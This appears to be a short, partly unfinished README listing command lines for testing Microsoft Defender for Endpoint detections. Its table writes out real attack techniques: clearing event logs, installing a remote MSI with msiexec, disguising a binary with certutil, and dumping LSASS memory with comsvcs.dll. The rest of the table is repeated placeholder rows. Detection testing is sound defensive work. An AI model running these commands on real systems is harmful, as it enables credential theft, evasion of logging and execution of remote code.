# Command lines for MDE

Below are some of the command lines that can be used to evaluate MDE (Microsoft defender for Endpoint).

| Name  | Command               |
|----------|---------------------------|
| Clean Windows Event logs | wevtutil cl system , wevtutil cl application, wevtutil cl security   |
| create a scheduled task | schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR "cmd /c date /T > C:\Windows\Temp\current_date.txt"   |
| use of living off the land binary to run malicious code | msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true   |
| Encode Certutil and decode | copy %windir%\system32\certutil.exe %temp%\tcm.tmp , %temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt, %temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe   |
| Dump LSASS.exe memory using comsvcs.dll | C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full   |
| Network Protection Command and Control | Invoke-WebRequest -URI https://commandcontrol.smartscreentestratings.com   |
| command3 | Description of command3   |
| command3 | Description of command3   |
| command3 | Description of command3   |
| command3 | Description of command3   |
| command3 | Description of command3   |
| command3 | Description of command3   |
| command3 | Description of command3   |






## References

1. [RedCanary](https://github.com/redcanaryco/invoke-atomicredteam/wiki/Installing-Invoke-AtomicRedTeam)
   
3. [jeffreyappel Blog](https://jeffreyappel.nl/microsoft-defender-for-endpoint-series-validate-defender-protection-and-additional-troubleshooting-part6/)
